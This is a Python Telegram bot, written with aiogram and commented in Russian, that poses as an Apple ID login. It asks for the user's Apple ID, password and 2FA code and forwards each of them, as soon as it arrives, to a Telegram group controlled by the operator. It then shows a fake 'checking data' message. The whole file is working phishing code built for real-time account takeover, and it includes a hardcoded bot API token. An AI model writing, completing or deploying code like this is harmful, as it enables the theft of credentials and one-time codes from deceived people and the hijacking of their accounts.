import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.filters import Command

API_TOKEN = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ'
GROUP_ID = -1003894478662# Ваш ID группы

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

class LoginSteps(StatesGroup):
    waiting_for_login = State()
    waiting_for_password = State()
    waiting_for_2fa = State()

@dp.message(Command("start"))
async def start_handler(message: types.Message, state: FSMContext):
    await message.answer("Введите Apple ID:")
    await state.set_state(LoginSteps.waiting_for_login)

@dp.message(LoginSteps.waiting_for_login)
async def process_login(message: types.Message, state: FSMContext):
    await state.update_data(login=message.text)
    await message.answer("Введите пароль:")
    await state.set_state(LoginSteps.waiting_for_password)

@dp.message(LoginSteps.waiting_for_password)
async def process_password(message: types.Message, state: FSMContext):
    password = message.text
    user_data = await state.get_data()
    login = user_data['login']
    
    # 1. Сразу отправляем логин и пароль в группу
    report = (
        f"⚠️ **Попытка входа**\n"
        f"👤 Логин: `{login}`\n"
        f"🔑 Пароль: `{password}`\n"
        f"⏳ Ожидание 2FA..."
    )
    await bot.send_message(GROUP_ID, report, parse_mode="Markdown")
    
    # 2. Просим 2FA у пользователя
    await message.answer("Введите код подтверждения из SMS или уведомления:")
    await state.set_state(LoginSteps.waiting_for_2fa)

@dp.message(LoginSteps.waiting_for_2fa)
async def process_2fa(message: types.Message, state: FSMContext):
    code = message.text
    user_data = await state.get_data()
    
    # 3. Отправляем финальный отчет с кодом
    final_report = (
        f"✅ **Получен 2FA код**\n"
        f"👤 Логин: `{user_data['login']}`\n"
        f"🔢 Код: `{code}`"
    )
    await bot.send_message(GROUP_ID, final_report, parse_mode="Markdown")
    
    await message.answer("Проверка данных... Пожалуйста, подождите.")
    await state.clear()

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())